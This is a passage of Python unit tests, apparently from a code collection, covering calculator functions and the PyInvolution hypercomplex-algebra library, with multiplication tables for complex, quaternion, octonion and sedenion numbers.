self.assertEqual(calc_exp(5,-3),.008 )\n        self.assertAlmostEqual(calc_exp(5,3.66),361.60149376)\n        self.assertAlmostEqual(calc_exp(4.876,3),115.92873337)\n         \n    def testSquareroot(self):\n        self.assertEqual(calc_squareroot(25), 5)\n        self.assertEqual(calc_squareroot(-5), 'Number Error!') \n        self.assertEqual(calc_squareroot(36), 6)\n        self.assertEqual(calc_squareroot(144), 12)\n        self.assertEqual(calc_squareroot(0), 0)\n        self.assertAlmostEqual(calc_squareroot(150.5), 12.26784414639)\n        \n    def testSquare(self):\n        self.assertEqual(calc_square(5), 25)\n        self.assertEqual(calc_square(-5), 25)\n        self.assertEqual(calc_square(0), 0)\n        self.assertAlmostEqual(calc_square(12.26), 150.3076)\n        \n    def testCube(self):\n        self.assertEqual(calc_cube(5), 125)\n        self.assertEqual(calc_cube(-5), -125)\n        self.assertEqual(calc_cube(0), 0)\n        self.assertAlmostEqual(calc_cube(2.34), 12.812904)\n  \n    def testSine(self):\n        self.assertEqual(calc_sine(0), 0.0)\n        self.assertAlmostEqual(calc_sine(30), 0.5)\n        self.assertAlmostEqual(calc_sine(60), 0.86602540)\n        self.assertAlmostEqual(calc_sine(90), 1.0)\n        self.assertAlmostEqual(calc_sine(125), 0.81915204)\n        self.assertEqual(calc_sine(180), 0.00)\n        self.assertAlmostEqual(calc_sine(270), -1.0)\n        self.assertEqual(calc_sine(360), 0.0)\n        self.assertAlmostEqual(calc_sine(390), 0.5)      \n        self.assertEqual(calc_sine(540), 0.0)\n        self.assertAlmostEqual(calc_sine(-30), -0.5)\n        self.assertEqual(calc_sine(-180), 0.0)\n        self.assertAlmostEqual(calc_sine(305.75), -0.81157398)    \n        \n    def testCosine(self):\n        self.assertAlmostEqual(calc_cosine(0), 1)\n        self.assertAlmostEqual(calc_cosine(30), 0.86602540)\n        self.assertAlmostEqual(calc_cosine(60), 0.5)\n        self.assertEqual(calc_cosine(90), 0.0)\n        self.assertAlmostEqual(calc_cosine(125), -0.57357643)\n        self.assertAlmostEqual(calc_cosine(180), -1.0)\n        self.assertEqual(calc_cosine(270), 0.0)\n        self.assertAlmostEqual(calc_cosine(360), 1.0)\n        self.assertAlmostEqual(calc_cosine(390), 0.86602540)\n        self.assertAlmostEqual(calc_cosine(540), -1.0)\n        self.assertAlmostEqual(calc_cosine(-30), 0.86602540)\n        self.assertAlmostEqual(calc_cosine(-180), -1.0)\n        self.assertAlmostEqual(calc_cosine(305.75), 0.58424966)    \n        \n     \nif __name__ == '__main__':\n    unittest.main()\n\n\n    \n    ", "371": "#!/usr/bin/python3\n# -*- coding: utf-8 -*-\n\"\"\"\ninvolution.albegra Unit Tests\n\ngeneral class wide, product table, algebraic, identity and quantum emulation tests\n\n  file: test.py\nsource: https://github.com/peawormsworth/PyInvolution\nauthor: Jeffrey B Anderson - truejeffanderson at gmail.com\n\"\"\"\n\nfrom involution.algebra import *\nfrom surreal import creation\nimport unittest\nimport pandas as pd\nfrom math import sqrt\nfrom random import random, uniform\n\nVERBOSE = 1\nDEBUG   = 1\n\ns = creation(days=7)\nzer = s[0]\none = s[1]\nneg = s[-1]\n\n# Class function to run any test here by class object...\nfrom io import StringIO\ndef run_test(test_class):\n    stream = StringIO()\n    runner = unittest.TextTestRunner(stream=stream)\n    result = runner.run(unittest.makeSuite(test_class))\n\n# Test Data...\n\ncomplex_table = \"\"\"\n    1  i\n    i -1\n\"\"\"\n#{{|}|},{|} {|},{{|}|} \n#{|},{{|}|} {|{|}},{|}\n\ndual_table = \"\"\"\n    1  i\n    i  0\n\"\"\"\n\nsplit_table = \"\"\"\n    1  i\n    i  1\n\"\"\"\n\nquaternion_table = \"\"\"\n    1  i  j  k\n    i -1  k -j\n    j -k -1  i\n    k  j -i -1\n\"\"\"\n\nsplit_quaternion_table = \"\"\"\n    1  i  j  k\n    i -1  k -j\n    j -k  1 -i\n    k  j  i  1 \n\"\"\"\n\ndual_complex_table = \"\"\"\n    1  i  j  k\n    i -1  k -j\n    j -k  0  0\n    k  j  0  0\n\"\"\"\n\nhyperbolic_quaternion_table = \"\"\"\n    1  i  j  k\n    i  1  k  j\n    j -k  1 -i\n    k -j  i -1\n\"\"\"\n\n# not currently used...\nbicomplex_table = \"\"\"\n    1  i  j  k\n    i -1  k -j\n    j  k  1  i\n    k -j  i -1\n\"\"\"\n\n# not currently used...\nsplit_quaternion_table = \"\"\"\n    1  i  j  k\n    i -1  k -j\n    j -k  1 -i\n    k  j  i  1\n\"\"\"\n\noctonion_table = \"\"\"\n    1  i  j  k  l  m  n  o  \n    i -1  k -j  m -l -o  n \n    j -k -1  i  n  o -l -m \n    k  j -i -1  o -n  m -l \n    l -m -n -o -1  i  j  k \n    m  l -o  n -i -1 -k  j\n    n  o  l -m -j  k -1 -i \n    o -n  m  l -k -j  i -1\n\"\"\"\n\nsplit_octonion_table = \"\"\"\n    1  i  j  k  l  m  n  o  \n    i -1  k -j -m  l -o  n \n    j -k -1  i -n  o  l -m \n    k  j -i -1 -o -n  m  l \n    l  m  n  o  1  i  j  k \n    m -l -o  n -i  1  k -j \n    n  o -l -m -j -k  1  i \n    o -n  m -l -k  j -i  1\n\"\"\"\n\ndual_quaternion_table = \"\"\"\n    1  i  j  k  l  m  n  o\n    i -1  k -j  m -l  o -n\n    j -k -1  i  n -o -l  m\n    k  j -i -1  o  n -m -l\n    l -m -n -o  0  0  0  0\n    m  l  o -n  0  0  0  0\n    n -o  l  m  0  0  0  0\n    o  n -m  l  0  0  0  0\n\"\"\"\n\nsedenion_table = \"\"\"\n    1  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w\n    i -1  k -j  m -l -o  n  q -p -s  r -u  t  w -v\n    j -k -1  i  n  o -l -m  r  s -p -q -v -w  t  u\n    k  j -i -1  o -n  m -l  s -r  q -p -w  v -u  t\n    l -m -n -o -1  i  j  k  t  u  v  w -p -q -r -s\n    m  l -o  n -i -1 -k  j  u -t  w -v  q -p  s -r\n    n  o  l -m -j  k -1 -i  v -w -t  u  r -s -p  q\n    o -n  m  l -k -j  i -1  w  v -u -t  s  r -q -p\n    p -q -r -s -t -u -v -w -1  i  j  k  l  m  n  o\n    q  p -s  r -u  t  w -v -i -1 -k  j -m  l  o -n\n    r  s  p -q -v -w  t  u -j  k -1 -i -n -o  l  m\n    s -r  q  p -w  v -u  t -k -j  i -1 -o  n -m  l\n    t  u  v  w  p -q -r -s -l  m  n  o -1 -i -j -k\n    u -t  w -v  q  p  s -r -m -l  o -n  i -1  k -j\n    v -w -t  u  r -s  p  q -n -o -l  m  j -k -1  i\n    w  v -u -t  s  r -q  p -o  n -m -l  k  j -i -1\n\"\"\"\n\ncomplex_abs_data = [\n    [ [ 1, 2], sqrt(5 ) ],\n    [ [ 3,-2], sqrt(13) ]\n]\n\ncomplex_add_data = [\n    [ [ 1, 2], [ 3,-3], [ 4,-1] ],\n    [ [ 3,-3], [ 1, 2], [ 4,-1] ]\n]\n\ncomplex_sub_data = [\n    [ [ 1, 2], [ 3,-3], [-2, 5] ],\n    [ [ 3,-3], [ 1, 2], [ 2,-5] ]\n]\n\ncomplex_product_data = [\n    [ [ 1, 2], [ 3,-3], [ 9, 3] ],\n    [ [ 3,-3], [ 1, 2], [ 9, 3] ]\n]\n\ncomplex_division_data = [\n    [ [ 1, 2], [ 3,-3], [-1/6, 1/2] ],\n    [ [ 3,-3], [ 1, 2], [-3/5,-9/5] ]\n]\n\ndual_abs_data = [\n    [ [ 1, 2], 1 ],\n    [ [ 3,-2], 3 ]\n]\n\ndual_add_data = [\n    [ [ 1, 2], [ 3,-3], [ 4,-1] ],\n    [ [ 3,-3], [ 1, 2], [ 4,-1] ]\n]\n\ndual_sub_data = [\n    [ [ 1, 2], [ 3,-3], [-2, 5] ],\n    [ [ 3,-3], [ 1, 2], [ 2,-5] ]\n]\n\ndual_product_data = [\n    [ [ 1, 2], [ 3,-3], [ 3, 3] ],\n    [ [ 3,-3], [ 1, 2], [ 3, 3] ]\n]\n\ndual_division_data = [\n    [ [ 1, 2], [ 3,-3], [1/3, 1] ],\n    [ [ 3,-3], [ 1, 2], [  3,-9] ]\n]\n\n\n# Data Generators...\n\ncomplex_abs_record      = [ (Complex(a),expect)                for a,expect in complex_abs_data      ]\ncomplex_add_record      = [ (Complex(a),Complex(b),Complex(c)) for a,b,c    in complex_add_data      ]\ncomplex_sub_record      = [ (Complex(a),Complex(b),Complex(c)) for a,b,c    in complex_sub_data      ]\ncomplex_product_record  = [ (Complex(a),Complex(b),Complex(c)) for a,b,c    in complex_product_data  ]\ncomplex_division_record = [ (Complex(a),Complex(b),Complex(c)) for a,b,c    in complex_division_data ]\ndual_abs_record         = [ (Dual(a),expect)                   for a,expect in dual_abs_data         ]\ndual_add_record         = [ (Dual(a),Dual(b),Dual(c))          for a,b,c    in dual_add_data         ]\ndual_sub_record         = [ (Dual(a),Dual(b),Dual(c))          for a,b,c    in dual_sub_data         ]\ndual_product_record     = [ (Dual(a),Dual(b),Dual(c))          for a,b,c    in dual_product_data     ]\ndual_division_record    = [ (Dual(a),Dual(b),Dual(c))          for a,b,c    in dual_division_data    ]\n\n\n# Class tools...\n\ndef random_vector(obj):\n    return obj([random() for i in range(dim(obj))])\n\ndef random_imaginary_vector(obj):\n    return obj([0] + [random() for i in range(dim(obj)-1)])\n\ndef unit_list (obj):\n    d = 2 ** len(obj.dp)\n    return [ obj( ( [0]*i + [1] + [0]*(d-i-1) )) for i in range(d) ]\n\n#def generate_table (obj):\n    #\"\"\"create a multiplication table for a given Algebra object in n\u00d7n matrix format (n=dimensions)\"\"\"\n    #units  = unit_list(obj)\n    #return [ [j*i for i in units] for j in units]\n\n#def generate_str (obj):\n    #\"\"\"create a multiplication table for a given Algebra object and return the elements in string format\"\"\"\n    #print('here')\n    #units  = unit_list(obj)\n    #print('here')\n    #return [ [str(j*i) for i in units] for j in units]\n\n\ndef generate_str (obj):\n    \"\"\"create a multiplication table for a given Algebra object and return the elements in string format\"\"\"\n    d = obj.dim(obj)\n    units = [ obj( ( [zer]*i + [one] + [zer]*(d-i-1) )) for i in range(d) ]\n    table = []\n    raw_table = []\n    for j in units:\n        table.append([])\n        raw_table.append([])\n        for i in units:\n            if DEBUG: raw_table[-1].append(str(j*i))\n            table[-1].append(str(obj([c.name_in(s) for c in (j*i).state])))\n            if DEBUG: print('{} \u00d7 {} = {}'.format(j,i,j*i))\n    return table\n        \n\ndef dim (obj):\n    \"\"\"the expected number of dimensions given the number of doubling products of this object\"\"\"\n    return 2**len(obj.dp)\n\ndef two_square_identity (x,y):\n    a,b = x\n    c,d = y\n    return [a*c - d*b, d*a + b*c]\n\ndef four_square_identity (x,y):\n    a,b,c,d = x\n    e,f,g,h = y\n\n    r = a*e - b*f - c*g - d*h\n    s = a*f + b*e + c*h - d*g\n    t = a*g - b*h + c*e + d*f\n    u = a*h + b*g - c*f + d*e\n    return [r,s,t,u]\n\ndef eight_square_identity (x,y):\n    a,b,c,d,e,f,g,h = x\n    i,j,k,l,m,n,o,p = y\n\n    # assuming i^2 = -1 ...\n    z1 = a*i - b*j - c*k - d*l - m*e - n*f - o*g - p*h\n    z2 = a*j + b*i + c*l - d*k - m*f + n*e + o*h - p*g\n    z3 = a*k - b*l + c*i + d*j - m*g - n*h + o*e + p*f\n    z4 = a*l + b*k - c*j + d*i - m*h + n*g - o*f + p*e\n    z5 = m*a - n*b - o*c - p*d + e*i + f*j + g*k + h*l\n    z6 = m*b + n*a + o*d - p*c - e*j + f*i - g*l + h*k\n    z7 = m*c - n*d + o*a + p*b - e*k + f*l + g*i - h*j\n    z8 = m*d + n*c - o*b + p*a - e*l - f*k + g*j + h*i\n    return [z1,z2,z3,z4,z5,z6,z7,z8]\n\n# this was calculated by hand. There is a fair chance that it is wrong.\ndef sixteen_square_identity (x,y):\n    a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14,a15,a16 = x\n    b1,b2,b3,b4,b5,b6,b7,b8,b9,b10,b11,b12,b13,b14,b15,b16 = y\n    # assuming i^2 = -1 ...\n    z1  = a1 * b1  - a2  * b2  - a3  * b3  - a4  * b4  - b5  * a5  - b6  * a6  - b7  * a7  - b8  * a8  - b9  * a9  - b10 * a10 - b11 * a11 - b12 * a12 - a13 * b13 - a14 * b14 - a15 * b15 - a16 * b16\n    z2  = a1 * b2  + a2  * b1  + a3  * b4  - a4  * b3  - b5  * a6  + b6  * a5  + b7  * a8  - b8  * a7  - b9  * a10 + b10 * a9  + b11 * a12 - b12 * a11 - a13 * b14 + a14 * b13 + a15 * b16 - a16 * b15\n    z3  = a1 * b3  - a2  * b4  + a3  * b1  + a4  * b2  - b5  * a7  - b6  * a8  + b7  * a5  + b8  * a6  - b9  * a11 - b10 * a12 + b11 * a9  + b12 * a10 - a13 * b15 - a14 * b16 + a15 * b13 + a16 * b14\n    z4  = a1 * b4  + a2  * b3  - a3  * b2  + a4  * b1  - b5  * a8  + b6  * a7  - b7  * a6  + b8  * a5  - b9  * a12 + b10 * a11 - b11 * a10 + b12 * a9  - a13 * b16 + a14 * b15 - a15 * b14 + a16 * b13\n    z5  = b5 * a1  - b6  * a2  - b7  * a3  - b8  * a4  + a5  * b1  + a6  * b2  + a7  * b3  + a8  * b4  - a13 * b9  - a14 * b10 - a15 * b11 - a16 * b12 + b13 * a9  + b14 * a10 + b15 * a11 + b16 * a12\n    z6  = b5 * a2  + b6  * a1  + b7  * a4  - b8  * a3  - a5  * b2  + a6  * b1  - a7  * b4  + a8  * b3  + a13 * b10 - a14 * b9  + a15 * b12 - a16 * b11 - b13 * a10 + b14 * a9  - b15 * a12 + b16 * a11\n    z7  = b5 * a3  - b6  * a4  + b7  * a1  + b8  * a2  - a5  * b3  + a6  * b4  + a7  * b1  - a8  * b2  + a13 * b11 - a14 * b12 - a15 * b9  + a16 * b10 - b13 * a11 + b14 * a12 + b15 * a9  - b16 * a10\n    z8  = b5 * a4  + b6  * a3  - b7  * a2  + b8  * a1  - a5  * b4  - a6  * b3  + a7  * b2  + a8  * b1  + a13 * b12 + a14 * b11 - a15 * b10 - a16 * b9  - b13 * a12 - b14 * a11 + b15 * a10 + b16 * a9\n    z9  = b9 * a1  - b10 * a2  - b11 * a3  - b12 * a4  - a5  * b13 - a6  * b14 - a7  * b15 - a8  * b16 + a9  * b1  + a10 * b2  + a11 * b3  + a12 * b4  + b5  * a13 + b6  * a14 + b7  * a15 + b8  * a16\n    z10 = b9 * a2  + b10 * a1  + b11 * a4  - b12 * a3  - a5  * b14 + a6  * b13 + a7  * b16 - a8  * b15 - a9  * b2  + a10 * b1  - a11 * b4  + a12 * b3  + b5  * a14 - b6  * a13 - b7  * a16 + b8  * a15\n    z11 = b9 * a3  - b10 * a4  + b11 * a1  + b12 * a2  - a5  * b15 - a6  * b16 + a7  * b13 + a8  * b14 - a9  * b3  + a10 * b4  + a11 * b1  - a12 * b2  + b5  * a15 + b6  * a16 - b7  * a13 - b8  * a14\n    z12 = b9 * a4  + b10 * a3  - b11 * a2  + b12 * a1  - a5  * b16 + a6  * b15 - a7  * b14 + a8  * b13 - a9  * b4  - a10 * b3  + a11 * b2  + a12 * b1  + b5  * a16 - b6  * a15 + b7  * a14 - b8  * a13\n    z13 = a5 * b9  - a6  * b10 - a7  * b11 - a8  * b12 + b13 * a1  + b14 * a2  + b15 * a3  + b16 * a4  - b5  * a9  + b6  * a10 + b7  * a11 + b8  * a12 + a13 * b1  - a14 * b2  - a15 * b3  - a16 * b4\n    z14 = a5 * b10 + a6  * b9  + a7  * b12 - a8  * b11 - b13 * a2  + b14 * a1  - b15 * a4  + b16 * a3  - b5  * a10 - b6  * a9  - b7  * a12 + b8  * a11 + a13 * b2  + a14 * b1  + a15 * b4  - a16 * b3\n    z15 = a5 * b11 - a6  * b12 + a7  * b9  + a8  * b10 - b13 * a3  + b14 * a4  + b15 * a1  - b16 * a2  - b5  * a11 + b6  * a12 - b7  * a9  - b8  * a10 + a13 * b3  - a14 * b4  + a15 * b1  + a16 * b2\n    z16 = a5 * b12 + a6  * b11 - a7  * b10 + a8  * b9  - b13 * a4  - b14 * a3  + b15 * a2  + b16 * a1  - b5  * a12 - b6  * a11 + b7  * a10 - b8  * a9  + a13 * b4  + a14 * b3  - a15 * b2  + a16 * b1\n    return [z1,z2,z3,z4,z5,z6,z7,z8,z9,z10,z11,z12,z13,z14,z15,z16]\n\n# Verbose output formats\n\ndef _test_unit_multiplication (self,expect,calc):\n    \"generic unit product table\"\n    imaginaries = '1ijklmnopqrstuvw'\n    #n  = 2**len(self.obj.dp)\n    n  = self.obj.dim(self.obj)\n    il = list(imaginaries[:n])\n\n    if DEBUG: print(\"\\ncalc:   {0}\\nexpect: {1}\\nil: {2}\".format(calc, expect, il))\n\n    if VERBOSE: \n        print(_verbose_unit_multiplication().format(\n            object           = self.obj.__name__,\n            expected_table   = pd.DataFrame( expect, index = il, columns = il ),\n            calculated_table = pd.DataFrame(   calc, index = il, columns = il )\n        ))\n    self.assertListEqual(calc, expect)\n\n\ndef _verbose_unit_multiplication ():\n   return \"\"\"\n\n=== expected {object} multiplication table ===\n\n{expected_table}\n\n=== calculated {object} multiplication table ===\n\n{calculated_table}\n\n...\n\"\"\"\n\ndef _verbose_square_identity (*l):\n   return \"\"\"\n\n=== {4} square identity test\n\nGiven:\n\n       x: {0}\n\n       y: {1}\n\nThese should be the same...\n\n{4} identity test product is:\n\n   formula(x \u00d7 y):\n\n      {2}\n\nThe involution product is:\n\n   code(x \u00d7 y):\n\n      {3}\n            \"\"\".format(*l)\n\n\ndef _claim_equal (calc,expect):\n    print(\"\"\"\n\nThese should be equal...\n\n   calc = {0}\n expect = {1}\n\n    \"\"\".format(calc,expect))\n\n\ndef _verbose_quaternion_metric_space ():\n    return \"\"\"\n\n=== Quaternion Metric Space test\n\np1: {0}\nq1: {1}\np2: {2}\nq2: {3}\n a: {4}\n\nThese should be equal...\n\n   calc = {5}\n expect = {6}\n\"\"\"\n\n\ndef _verbose_quaternion_dot_product ():\n    return \"\"\"\n\n=== Quaternion dot product test\n\nGiven:\n\n      p: {0}\n      q: {1}\n\nthen these should be equal...\n\n  calc1: {2}\n  calc2: {3}\n expect: {4}\n\"\"\"\n\n\ndef _verbose_weak_alternative ():\n    return \"\"\"\n\n=== {15} weak alternative condition test\n\nGiven:\n\n           x  = {0}\n           y  = {1}\n\nThese should{14} be equal...\n\n (y \u00d7 x) \u00d7 x  = {2}\n y \u00d7(x  \u00d7 x)  = {3}\n\nThese should{14} be equal...\n\n (x \u00d7 y) \u00d7 x  = {4}\n  x \u00d7(y  \u00d7 x  = {5}\n\nThese should{14} be equal...\n\n (x \u00d7 x) \u00d7 y  = {6}\n  x \u00d7(x  \u00d7 y) = {7}\n\nThese should{14} be equal...\n\n (x \u00d7 y) \u00d7 y  = {8}\n  x \u00d7(y  \u00d7 y) = {9}\n\nThese should{14} be equal...\n\n (y \u00d7 x) \u00d7 y  = {10}\n  y \u00d7(x  \u00d7 y) = {11}\n\nThese should{14} be equal...\n\n (y \u00d7 y) \u00d7 x  = {12}\n  y \u00d7(y  \u00d7 x) = {13}\n\"\"\"\n\n\ndef _verbose_diophantus ():\n    return \"\"\"\n\n=== Diophantus (Brahmagupta-Fibonacci) Identity test\n\nGiven:\n\n             x = {0}\n             y = {1}\n\nHaving absolute values\n\n        abs(x) = {2}\n        abs(y) = {3}\n\nThese should{4} be equal...\n\n abs(x)\u00d7abs(y) = {5}\n      abs(x\u00d7y) = {6}\n\n\"\"\"\n\n\ndef _verbose_split_quaternion_nilpotent ():\n    return \"\"\"\n\n=== Quaternion Nilpotent test\n\nGiven the nilpotent:\n\n          q = {0}\n\nverify it squares to zero:\n\n        q\u00d7q = {1}\n     expect = {2}\n\"\"\"\n\n\ndef _verbose_split_quaternion_idempotent ():\n    return \"\"\"\n\n=== Quaternion Idempotent test\n\nGiven the idempotent:\n\n          q = {0}\n\n...verify it squares to itself:\n\n        q\u00d7q = {1}\n     expect = {2}\n\n\"\"\"\n\n\ndef _verbose_split_octonion_conjugation ():\n    return \"\"\" \n\n=== Split Octonion Conjugation test\n\nComparing conjugate against this formula:\n\n  conjugate(x) = -1/6*( x + (i*x)*i + (j*x)*j + (k*x)*k + (l*x)*l + (m*x)*m + (n*x)*n + (o*x)*o )\n\"\"\"\n\n\ndef _verbose_octonion_conjugation ():\n    return \"\"\" \n\n=== Octonion Conjugation test\n\nComparing conjugate against this formula:\n\n  conjugate(x) = -1/6*( x + (i*x)*i + (j*x)*j + (k*x)*k + (l*x)*l + (m*x)*m + (n*x)*n + (o*x)*o )\n\"\"\"\n\n\ndef _verbose_quaternion_conjugation ():\n    return \"\"\" \n\n=== Quaternion Conjugation test\n\nComparing conjugate against this formula:\n\n  conjugate(x) = -1/2*( x + (i*x)*i + (j*x)*j + (k*x)*k )\n\"\"\"\n\n\ndef _verbose_commutative ():\n    return \"\"\"\n\n=== {3} Commutative Property test\n\nThese should{0} be equal...\n\n     x \u00d7 y = {1}\n     y \u00d7 x = {2}\n\"\"\"\n\n\ndef _verbose_moufang_condition ():\n    return \"\"\"\n\n=== {12} Moufang Condition test\n\nGiven:\n\n       x = {0}\n       y = {1}\n       z = {2}\n\nThese should{11} be equal...\n\n  z \u00d7 (x \u00d7 (z \u00d7 y)) = {3}\n ((z  \u00d7 x) \u00d7 z) \u00d7 y = {4}\n\nThese should{11} be equal...\n\n x \u00d7 (z \u00d7 (y \u00d7 z )) = {5}\n (( x \u00d7 z) \u00d7 y) \u00d7 z = {6}\n\nThese should{11} be equal...\n\n (z \u00d7 x) \u00d7 (y \u00d7 z ) = {7}\n   (z \u00d7 (x \u00d7 y))\u00d7 z = {8}\n\nThese should{11} be equal...\n\n (z \u00d7 x) \u00d7 (y \u00d7 z ) = {9}\n  z \u00d7((x \u00d7 y) \u00d7 z ) = {10}\n\"\"\"\n\n\ndef _verbose_power_associative ():\n    return \"\"\"\n\n=== Power Associative tests\n\nGiven random unit vectors...\n\n             x = {0}\n             y = {1}\n         x \u00d7 y = {2}\n\nHaving a magnitude (abs) of 1...\n\n        abs(x) = {3}\n        abs(y) = {4}\n\nProduce a product of magnitude 1...\n\n    abs(x \u00d7 y) = {5}\n\nThey should be in the same spot...\n\n distance to 1 = {6}\n\"\"\"\n\n\ndef _verbose_split_quaternion_conjugate ():\n    return \"\"\"\n\n=== Split Quaternion Conjugate test\n\nGiven:\n\n q = (a,b)\n q = ((w+zi),(y+xi))\n\nThen:\n\n conj(x) \u00d7 x = w\u00b2 + x\u00b2 - y\u00b2 - z\u00b2\n\"\"\"\n\n\ndef _debug_power_associative ():\n    return \"\"\"\n       x: {0}\n       y: {1}\n   x \u00d7 y: {2}\n\"\"\"\n\n\n# Classes\n\nclass TestComplex(unittest.TestCase):\n    obj = Complex\n\n    def test_unit_multiplication (self):\n        \"Complex number unit product table\"\n        expect = [ a.split() for a in complex_table.strip().split(\"\\n\") ]\n        print('expect:',expect)\n        calc = generate_str(self.obj)\n        _test_unit_multiplication(self, expect=expect, calc=calc)\n\n    def Xtest_abs_results (self):\n        \"various absolute results\"\n        for row in complex_abs_record:\n            input, expect = row\n            calc = abs(input)\n            if DEBUG or VERBOSE:\n                print(\"\\n=== Complex Absolute Value tests\")\n                print(\"\\n|{0}| =\\nexpect = {1}\\n  calc = {2}\".format(input, expect, calc))\n            self.assertEqual(calc, expect)\n\n    def Xtest_add_results (self):\n        \"various addition results\"\n        for row in complex_add_record:\n            a,b,expect = row\n            calc = a+b\n            if DEBUG or VERBOSE:\n                print(\"\\n=== Complex Addition tests\")\n                print(\"\\n{0} + {1} =\\nexpect = {2}\\n  calc = {3}\".format(a, b, expect, calc))\n            self.assertEqual(expect,calc)\n            self.assertIsInstance(expect, Complex)\n\n    def Xtest_sub_results (self):\n        \"various subtraction results\"\n        for row in complex_sub_record:\n            a,b,expect = row\n            calc = a-b\n            if DEBUG or VERBOSE:\n                print(\"\\n=== Complex Difference tests\")\n                print(\"\\n{0} - {1} =\\nexpect = {2}\\n  calc = {3}\".format(a, b, expect, calc))\n            self.assertEqual(expect, calc)\n            self.assertIsInstance(expect, Complex)\n\n    def Xtest_product_results (self):\n        \"various product results\"\n        for row in complex_product_record:\n            a,b,expect = row\n            calc = a*b\n            if DEBUG or VERBOSE:\n                print(\"\\n=== Complex Product tests\")\n                print(\"\\n{0} \u00d7 {1} =\\nexpect = {2}\\n  calc = {3}\".format(a, b, expect, calc))\n            self.assertEqual(expect, calc)\n            self.assertIsInstance(expect, Complex)\n\n    def Xtest_division_results (self):\n        \"various division results\"\n        for row in complex_division_record:\n            a,b,expect = row\n            calc = a/b\n            if DEBUG or VERBOSE:\n                print(\"\\n=== Complex Division tests\")\n                print(\"\\n{0} / {1} =\\nexpect = {2}\\n  calc = {3}\".format(a, b, expect, calc))\n            self.assertEqual(expect, calc)\n            self.assertIsInstance(expect, Complex)\n\n\nclass TestDual(unittest.TestCase):\n\n    \"\"\"\nWarning: there is a problem with this test.\nThe dual numbers do not all have absolute values.\nSo equality testing does not work.\nEquality is based on distance between points.\nSo the distance between a & b = |a-b|\nBut since the absolute value of a dual number ignores the imaginary...\ntwo dual numbers that have the same real value will have the same magnitude\nregardless of the imaginary quantity.\nIt means that the dual class thinks (1,0) == (1,1000000)... which can not be right.\nShould equality be forced to use pythagorus for distance calculations OR \nis that not allowed?\nHow can I tell if two dual numbers are so close they're probably be equal?\nUntil then, these tests are probably garbage.\n    \"\"\"\n\n    obj = Dual\n\n    def test_unit_multiplication (self):\n        \"Dual number unit product table\"\n        expect = [ a.split() for a in dual_table.strip().split(\"\\n\") ]\n        calc = generate_str(self.obj)\n        _test_unit_multiplication(self, expect=expect, calc=calc)\n\n    def Xtest_abs_results (self):\n        \"various absolute results\"\n        if DEBUG or VERBOSE:\n            print()\n        for row in dual_abs_record:\n            input, expect = row\n            calc = abs(input)\n            if DEBUG or VERBOSE:\n                print(\"\\n=== Dual Absolute Value tests\\n\")\n                print(\"|%s| =\\nexpect = %s\\n  calc = %s\" % (input, expect, calc))\n            self.assertEqual(calc, expect)\n\n    def Xtest_add_results (self):\n        \"various addition results\"\n        if DEBUG or VERBOSE:\n            print()\n        for row in dual_add_record:\n            a,b,expect = row\n            calc = a+b\n            if DEBUG or VERBOSE:\n                print(\"\\n=== Dual Addition tests\\n\")\n                print(\"\\n%s + %s =\\nexpect = %s\\n  calc = %s\" % (a,b, expect, calc))\n            self.assertEqual(expect,calc)\n            self.assertIsInstance(expect, self.obj)\n\n    def Xtest_sub_results (self):\n        \"various subtraction results\"\n        if DEBUG or VERBOSE:\n            print()\n        for row in dual_sub_record:\n            a,b,expect = row\n            calc = a-b\n            if DEBUG or VERBOSE:\n                print(\"\\n=== Dual Difference tests\\n\")\n                print(\"\\n%s - %s =\\nexpect = %s\\n  calc = %s\" % (a,b, expect, calc))\n            self.assertEqual(expect,calc)\n            self.assertIsInstance(expect, self.obj)\n\n    def Xtest_product_results (self):\n        \"various product results\"\n        if DEBUG or VERBOSE:\n            print()\n        for row in dual_product_record:\n            a,b,expect = row\n            calc = a*b\n            if DEBUG or VERBOSE:\n                print(\"\\n=== Dual Product tests\\n\")\n                print(\"\\n%s \u00d7 %s =\\nexpect = %s\\n  calc = %s\" % (a,b, expect, calc))\n            self.assertEqual(expect,calc)\n            self.assertIsInstance(expect, self.obj)\n\n    def Xtest_division_results (self):\n        \"various division results\"\n        if DEBUG or VERBOSE:\n            print()\n        for row in dual_division_record:\n            a,b,expect = row\n            calc = a/b\n            if DEBUG or VERBOSE:\n                print(\"\\n=== Dual Division tests\\n\")\n                print(\"\\n%s / %s =\\nexpect = %s\\n  calc = %s\" % (a,b, expect, calc))\n            self.assertEqual(expect,calc)\n            self.assertIsInstance(expect, self.obj)\n\n\nclass TestSplit(unittest.TestCase):\n    obj = Split\n\n    def test_unit_multiplication (self):\n        \"Split number unit product table\"\n        expect = [ a.split() for a in split_table.strip().split(\"\\n\") ]\n        calc = generate_str(self.obj)\n        _test_unit_multiplication(self, expect=expect, calc=calc)\n\n\nclass TestQuaternion(unittest.TestCase):\n    obj = Quaternion\n\n    def test_unit_multiplication (self):\n        \"Quaternion unit product table\"\n        expect      = [ a.split() for a in quaternion_table.strip().split(\"\\n\") ]\n        calc        = generate_str(self.obj)\n        _test_unit_multiplication(self, expect=expect, calc=calc)\n\n    def Xtest_conjugation (self):\n        \"Long form congugation\"\n        loops = 100\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            x = random_vector(self.obj)\n            calc = x.conj()\n            o,i,j,k = unit_list(self.obj)\n            expect = -1/2*( x + (i*x)*i + (j*x)*j + (k*x)*k )\n            if DEBUG:\n                _claim_equal(repr(calc),repr(expect))\n            self.assertEqual(calc,expect)\n        if VERBOSE: \n            print(_verbose_quaternion_conjugation())\n            _claim_equal(calc,expect)\n\n    def Xtest_conjugate_product (self):\n        \"the product of a vector with its conjugate is the multidimensional Pythagarus formula\"\n        loops = 100\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n            print(\"\\n=== Quaternion Conjugate Product test\\n\")\n        for n in range(loops):\n            x = random_vector(self.obj)\n            calc = x*x.conj()\n            expect = sum([a ** 2 for a in x])\n            self.assertEqual(calc,expect)\n        if DEBUG: \n            _claim_equal(repr(calc),repr(expect))\n        if VERBOSE:\n            _claim_equal(calc,expect)\n\n    def Xtest_addition_metric_space (self):\n        \"Test addition is continuous in Quaternion metric topology\"\n        object = Quaternion\n        loops = 100\n        if VERBOSE or DEBUG: \n            print(loops, 'loops')\n        for n in range(loops):\n            p1 = random_vector(self.obj)\n            p2 = random_vector(self.obj)\n            q1 = random_vector(self.obj)\n            q2 = random_vector(self.obj)\n            a  = 